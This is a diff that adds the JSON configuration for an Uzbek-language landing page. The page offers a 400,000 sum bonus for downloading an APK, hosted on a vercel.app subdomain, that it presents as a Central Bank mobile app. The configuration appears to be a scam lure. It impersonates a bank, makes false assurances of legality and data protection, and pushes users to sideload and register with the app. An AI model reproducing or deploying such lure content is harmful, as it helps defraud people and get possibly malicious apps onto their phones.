@@ -1,0 +1,30 @@
+{
+  "apkUrl": "https://uzbekistan-info.vercel.app/docs/ORMBank/ORMBank.apk",
+  "thankYouUrl": "/thankyou2.html",
+  "texts": {
+    "badge": "🎁 CHEGIRMA AKSIYASI",
+    "bonusLabel": "BONUS OLING!",
+    "bonusAmount": "400,000",
+    "currency": "SUM",
+    "description": "Markaziy Banki mobiliy ilovasini yuklab oling va darhol <strong>400,000 sum</strong> bonus oling!",
+    "ctaButton": "ILOVASINI YUKLAB OLING",
+    "features": [
+      "100% shifoxonalashtirilgan va qonunlashtirgan",
+      "O'zbekiston Respublikasining bankik qonunlari asosida",
+      "Sizning ma'lumotlaringiz 100% himoyalangan",
+      "24/7 Uzbek tilida qo'llab-quvvatlash"
+    ],
+    "card": {
+      "label": "BONUS",
+      "amount": "400",
+      "currency": "minglik SUM",
+      "button": "DARHOL OLING"
+    },
+    "footer": "✓ <strong>Yuklab oling</strong> → <strong>Ro'yxatdan o'ting</strong> → <strong>Tasdiqla</strong> → <strong>Bonusni oling!</strong>"
+  },
+  "contact": {
+    "phone": "+998 71 212-62-05"
+  },
+  "logo": "./img/logo-uz.svg"
+}
+
